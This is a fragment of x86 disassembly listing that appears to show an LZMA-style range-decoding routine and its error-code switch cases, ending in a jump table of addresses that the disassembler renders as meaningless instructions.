  407280:	ff 45 90             	incl   -0x70(%ebp)
  407283:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407286:	ff 4d b8             	decl   -0x48(%ebp)
  407289:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  40728d:	7e 5e                	jle    0x4072ed
  40728f:	8b 45 b0             	mov    -0x50(%ebp),%eax
  407292:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407295:	c1 e9 0b             	shr    $0xb,%ecx
  407298:	8d 14 00             	lea    (%eax,%eax,1),%edx
  40729b:	8b 45 a8             	mov    -0x58(%ebp),%eax
  40729e:	8d 34 02             	lea    (%edx,%eax,1),%esi
  4072a1:	89 75 ac             	mov    %esi,-0x54(%ebp)
  4072a4:	66 8b 06             	mov    (%esi),%ax
  4072a7:	0f b7 f8             	movzwl %ax,%edi
  4072aa:	0f af cf             	imul   %edi,%ecx
  4072ad:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  4072b0:	73 17                	jae    0x4072c9
  4072b2:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  4072b5:	b9 00 08 00 00       	mov    $0x800,%ecx
  4072ba:	2b cf                	sub    %edi,%ecx
  4072bc:	c1 f9 05             	sar    $0x5,%ecx
  4072bf:	03 c8                	add    %eax,%ecx
  4072c1:	d1 65 b0             	shll   $1,-0x50(%ebp)
  4072c4:	66 89 0e             	mov    %cx,(%esi)
  4072c7:	eb 16                	jmp    0x4072df
  4072c9:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  4072cc:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  4072cf:	66 8b c8             	mov    %ax,%cx
  4072d2:	66 c1 e9 05          	shr    $0x5,%cx
  4072d6:	2b c1                	sub    %ecx,%eax
  4072d8:	42                   	inc    %edx
  4072d9:	66 89 06             	mov    %ax,(%esi)
  4072dc:	89 55 b0             	mov    %edx,-0x50(%ebp)
  4072df:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  4072e6:	73 9e                	jae    0x407286
  4072e8:	e9 74 ff ff ff       	jmp    0x407261
  4072ed:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  4072f0:	8b 5d b0             	mov    -0x50(%ebp),%ebx
  4072f3:	33 c0                	xor    %eax,%eax
  4072f5:	40                   	inc    %eax
  4072f6:	d3 e0                	shl    %cl,%eax
  4072f8:	2b d8                	sub    %eax,%ebx
  4072fa:	8b 45 84             	mov    -0x7c(%ebp),%eax
  4072fd:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  407300:	e9 04 ff ff ff       	jmp    0x407209
  407305:	01 5d d0             	add    %ebx,-0x30(%ebp)
  407308:	8b 45 80             	mov    -0x80(%ebp),%eax
  40730b:	e9 f9 fe ff ff       	jmp    0x407209
  407310:	c7 85 78 ff ff ff 01 	movl   $0x1,-0x88(%ebp)
  407317:	00 00 00 
  40731a:	e9 88 00 00 00       	jmp    0x4073a7
  40731f:	c7 85 78 ff ff ff 03 	movl   $0x3,-0x88(%ebp)
  407326:	00 00 00 
  407329:	eb 7c                	jmp    0x4073a7
  40732b:	c7 85 78 ff ff ff 0d 	movl   $0xd,-0x88(%ebp)
  407332:	00 00 00 
  407335:	eb 70                	jmp    0x4073a7
  407337:	c7 85 78 ff ff ff 0e 	movl   $0xe,-0x88(%ebp)
  40733e:	00 00 00 
  407341:	eb 64                	jmp    0x4073a7
  407343:	c7 85 78 ff ff ff 0f 	movl   $0xf,-0x88(%ebp)
  40734a:	00 00 00 
  40734d:	eb 58                	jmp    0x4073a7
  40734f:	c7 85 78 ff ff ff 1a 	movl   $0x1a,-0x88(%ebp)
  407356:	00 00 00 
  407359:	eb 4c                	jmp    0x4073a7
  40735b:	c7 85 78 ff ff ff 1b 	movl   $0x1b,-0x88(%ebp)
  407362:	00 00 00 
  407365:	eb 40                	jmp    0x4073a7
  407367:	c7 85 78 ff ff ff 0c 	movl   $0xc,-0x88(%ebp)
  40736e:	00 00 00 
  407371:	eb 34                	jmp    0x4073a7
  407373:	c7 85 78 ff ff ff 10 	movl   $0x10,-0x88(%ebp)
  40737a:	00 00 00 
  40737d:	eb 28                	jmp    0x4073a7
  40737f:	83 4d d0 ff          	orl    $0xffffffff,-0x30(%ebp)
  407383:	eb 22                	jmp    0x4073a7
  407385:	c7 85 78 ff ff ff 1c 	movl   $0x1c,-0x88(%ebp)
  40738c:	00 00 00 
  40738f:	eb 16                	jmp    0x4073a7
  407391:	c7 85 78 ff ff ff 05 	movl   $0x5,-0x88(%ebp)
  407398:	00 00 00 
  40739b:	eb 0a                	jmp    0x4073a7
  40739d:	c7 85 78 ff ff ff 18 	movl   $0x18,-0x88(%ebp)
  4073a4:	00 00 00 
  4073a7:	8b bd 70 ff ff ff    	mov    -0x90(%ebp),%edi
  4073ad:	6a 22                	push   $0x22
  4073af:	59                   	pop    %ecx
  4073b0:	8d b5 78 ff ff ff    	lea    -0x88(%ebp),%esi
  4073b6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4073b8:	33 c0                	xor    %eax,%eax
  4073ba:	eb 03                	jmp    0x4073bf
  4073bc:	83 c8 ff             	or     $0xffffffff,%eax
  4073bf:	5f                   	pop    %edi
  4073c0:	5e                   	pop    %esi
  4073c1:	5b                   	pop    %ebx
  4073c2:	c9                   	leave
  4073c3:	c3                   	ret
  4073c4:	bb 69 40 00 60       	mov    $0x60004069,%ebx
  4073c9:	6a 40                	push   $0x40
  4073cb:	00 fb                	add    %bh,%bl
  4073cd:	6a 40                	push   $0x40
  4073cf:	00 d0                	add    %dl,%al
  4073d1:	6a 40                	push   $0x40
  4073d3:	00 90 71 40 00 de    	add    %dl,-0x21ffbf8f(%eax)
  4073d9:	71 40                	jno    0x40741b
  4073db:	00 21                	add    %ah,(%ecx)
  4073dd:	6b 40 00 c0          	imul   $0xffffffc0,0x0(%eax),%eax
  4073e1:	6d                   	insl   (%dx),%es:(%edi)
  4073e2:	40                   	inc    %eax
  4073e3:	00 2a                	add    %ch,(%edx)
  4073e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4073e6:	40                   	inc    %eax
  4073e7:	00 6d 6e             	add    %ch,0x6e(%ebp)
  4073ea:	40                   	inc    %eax
  4073eb:	00 de                	add    %bl,%dh
  4073ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4073ee:	40                   	inc    %eax
  4073ef:	00 05 6f 40 00 c5    	add    %al,0xc500406f
  4073f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4073f6:	40                   	inc    %eax
  4073f7:	00 ba 6b 40 00 73    	add    %bh,0x7300406b(%edx)
  4073fd:	6c                   	insb   (%dx),%es:(%edi)
  4073fe:	40                   	inc    %eax
  4073ff:	00 37                	add    %dh,(%edi)
  407401:	6d                   	insl   (%dx),%es:(%edi)
  407402:	40                   	inc    %eax
  407403:	00 48 70             	add    %cl,0x70(%eax)
  407406:	40                   	inc    %eax
  407407:	00 18                	add    %bl,(%eax)
  407409:	6e                   	outsb  %ds:(%esi),(%dx)
  40740a:	40                   	inc    %eax
  40740b:	00 57 71             	add    %dl,0x71(%edi)
  40740e:	40                   	inc    %eax
  40740f:	00 14 72             	add    %dl,(%edx,%esi,2)
  407412:	40                   	inc    %eax
  407413:	00 05 73 40 00 3f    	add    %al,0x3f004073
  407419:	6f                   	outsl  %ds:(%esi),(%dx)
  40741a:	40                   	inc    %eax
  40741b:	00 56 6f             	add    %dl,0x6f(%esi)
  40741e:	40                   	inc    %eax
  40741f:	00 52 72             	add    %dl,0x72(%edx)
  407422:	40                   	inc    %eax
  407423:	00 61 72             	add    %ah,0x72(%ecx)
  407426:	40                   	inc    %eax
  407427:	00 84 6f 40 00 06 6d 	add    %al,0x6d060040(%edi,%ebp,2)
  40742e:	40                   	inc    %eax
  40742f:	00 91 6e 40 00 0e    	add    %dl,0xe00406e(%ecx)
  407435:	71 40                	jno    0x407477
	...
